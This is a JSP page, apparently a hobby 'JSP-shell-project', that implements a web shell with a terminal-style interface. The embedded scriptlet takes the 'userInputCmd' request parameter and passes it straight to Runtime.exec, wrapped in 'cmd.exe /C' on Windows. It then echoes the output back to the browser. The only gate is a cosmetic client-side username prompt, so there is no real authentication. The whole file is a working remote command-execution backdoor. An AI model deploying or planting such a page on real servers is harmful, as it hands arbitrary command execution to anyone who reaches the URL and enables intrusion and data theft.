<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<%@ page import="java.util.*,java.io.*"%>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="stylesheet" href="css/index.css">
    <title>JSP-cmd</title>
</head>
<body>
    <header>
        <h1>This is JSP-shell-project.</h1>
    </header>
    <div class="userId hide js-getUserIdContainer">
            <form class="js-getUserIdForm">
                <h2>hello, wellcome!</h2>
                Input User Name :
                <input type="text" autocomplete ="off">
            </form>
    </div>

    <div class="shellContain hide js-shellContain">
       
        <div class="shellWasInput ">
            <h3 class="notice" >wellcome! This is your shell history : </h3>
            <ol class="js-ol orderlist">
            </ol>
        </div>
        <div class="cmdResult">
            <h3 class="notice">this is cmdResult section</h3>
            <pre>
            <%
				String inputUserCmd = request.getParameter("userInputCmd");
				if(inputUserCmd == null) {
					%>
					<p align =center>
***********************************명령어를 입력해 주세요***********************************
					</p>
			<%
				}
				else{
					Process p;
					if ( System.getProperty("os.name").toLowerCase().indexOf("windows") != -1){
						p = Runtime.getRuntime().exec("cmd.exe /C " + inputUserCmd);
					}
					else{
						p = Runtime.getRuntime().exec(inputUserCmd);
					}
					InputStreamReader insr = new InputStreamReader(p.getInputStream(),"euc-kr");
					BufferedReader br = new BufferedReader(insr);
					String result = br.readLine();
					while ( result != null ){
						out.println(result); 
						result = br.readLine(); 
					}
				}
			%>
            </pre>     
        </div>



        <div class="shellInput js-inputCmdForm">
            <form action="./index.jsp" method="get">
                <span style="margin-left : 5px;" class="js-setUserIdSpan">
                   
                </span>@ :~$
                <input class="js-inputCmd" name="userInputCmd" type="text" autocomplete ="off" >
            </form>
        </div>
    </div>
    <footer>
        homeless-leesky
    </footer>
    <script src="js/userId.js"></script>
    <script src="js/history.js"></script>
</body>
</html>
